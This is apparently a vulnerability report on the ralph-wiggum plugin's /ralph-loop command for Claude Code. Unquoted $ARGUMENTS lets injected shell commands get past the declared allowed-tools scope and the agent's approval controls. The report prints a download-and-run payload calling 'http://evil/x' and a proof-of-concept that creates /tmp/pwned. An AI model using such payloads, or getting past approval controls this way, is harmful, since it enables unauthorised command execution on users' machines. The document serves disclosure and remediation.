### Title
Unquoted `$ARGUMENTS` in `/ralph-loop` command body allows shell command injection beyond declared `allowed-tools` scope - (File: `plugins/ralph-wiggum/commands/ralph-loop.md`)

### Summary
The `/ralph-loop` command template declares a strict `allowed-tools` scope of `Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)`, but the command body substitutes the raw, unquoted `$ARGUMENTS` directly into the shell command line executed in the ` ```! ` block. Because the substitution happens as literal text interpolation before the resulting string is handed to `bash`, any shell metacharacters in the argument (`;`, `` ` ``, `$()`, `|`, `&&`) are interpreted by the shell, letting attacker-controlled text execute arbitrary commands outside the single allow-listed script invocation.

### Finding Description
The command frontmatter and body are: [1](#0-0) 

`allowed-tools` restricts the command to only invoke `setup-ralph-loop.sh`, implying that Claude Code's approval/allowlist machinery should only ever need to authorize that one script. However, the executable line:
```
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" $ARGUMENTS
```
interpolates `$ARGUMENTS` without quotes. `$ARGUMENTS` is populated from the user/attacker-controlled text following `/ralph-loop` (e.g. `PROMPT [--max-iterations N] [--completion-promise TEXT]`), and this text can originate from repository or issue content that gets forwarded verbatim into the slash command (a common Claude Code + CI/agent pattern where issue/PR text is passed as the prompt argument). Because the resulting string is executed by a shell (the ` ```! ` fenced block is Claude Code's "execute shell" directive), any embedded shell metacharacters break out of the intended single allow-listed command and are executed as additional, unscoped shell operations — e.g. a payload such as:
```
build feature`; curl http://evil/x | bash #`
```
would run as `"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" build feature; curl http://evil/x | bash #` — the semicolon/backtick segments are not part of the allow-listed script and bypass the intended `Bash(setup-ralph-loop.sh:*)` restriction. The script itself (`setup-ralph-loop.sh`) parses `$@` safely per-argument, but that protection is irrelevant once the shell has already re-tokenized `$ARGUMENTS` due to the missing quotes in the command template — the injection point is upstream of the script.

No sanitization, escaping, or allowlist check exists in `ralph-loop.md` to reject shell metacharacters in `$ARGUMENTS` before interpolation, and the `allowed-tools` declaration provides no protection against this because the additional commands are injected inside the same shell invocation rather than as a separate tool call that Claude Code's approval system would intercept.

### Impact Explanation
This breaks the invariant that a shipped command must not exceed its declared tool scope: `allowed-tools` promises execution is confined to `setup-ralph-loop.sh`, but unquoted argument interpolation allows arbitrary local command execution in the user's shell session, entirely bypassing Claude Code's per-tool approval/deny controls (since from Claude Code's perspective only one Bash tool invocation of the allow-listed script occurred). This matches "Unauthorized local command execution that bypasses Claude Code approval or deny controls."

### Likelihood Explanation
Exploitation only requires an unprivileged attacker to control the text passed as the `/ralph-loop` prompt argument (directly by the user, or indirectly via repository/issue text that an automation flow forwards as the command argument). No special privileges, secrets, or social engineering are needed — a single crafted string reaching `$ARGUMENTS` is sufficient, making this reliably reproducible.

### Recommendation
Quote `$ARGUMENTS` (and any option values) in the command template, e.g.:
```
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" "$ARGUMENTS"
```
though this alone is insufficient if `$ARGUMENTS` is a pre-joined string with embedded metacharacters; the underlying fix should ensure Claude Code passes command arguments as an argv array to the allow-listed executable rather than interpolating them into a shell string, and/or the command template should validate/reject shell metacharacters before invoking the ` ```! ` shell block.

### Proof of Concept
Integration test plan:
1. Set up a Claude Code session with the `ralph-wiggum` plugin loaded.
2. Invoke `/ralph-loop` with an argument payload containing shell metacharacters, e.g.:
   `/ralph-loop test`; touch /tmp/pwned; echo `"`
3. Observe whether `/tmp/pwned` is created — its creation indicates the shell executed a command outside the allow-listed `setup-ralph-loop.sh` invocation.
4. Assert: no additional file (`/tmp/pwned`) should be created and no command besides `setup-ralph-loop.sh` should execute; failure of this assertion demonstrates the tool-scope bypass.
5. Repeat with payloads using backticks and `$()` command substitution to confirm multiple injection vectors.

### Citations

**File:** plugins/ralph-wiggum/commands/ralph-loop.md (L1-14)
```markdown
---
description: "Start Ralph Wiggum loop in current session"
argument-hint: "PROMPT [--max-iterations N] [--completion-promise TEXT]"
allowed-tools: ["Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)"]
hide-from-slash-command-tool: "true"
---

# Ralph Loop Command

Execute the setup script to initialize the Ralph loop:

```!
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" $ARGUMENTS
```
```
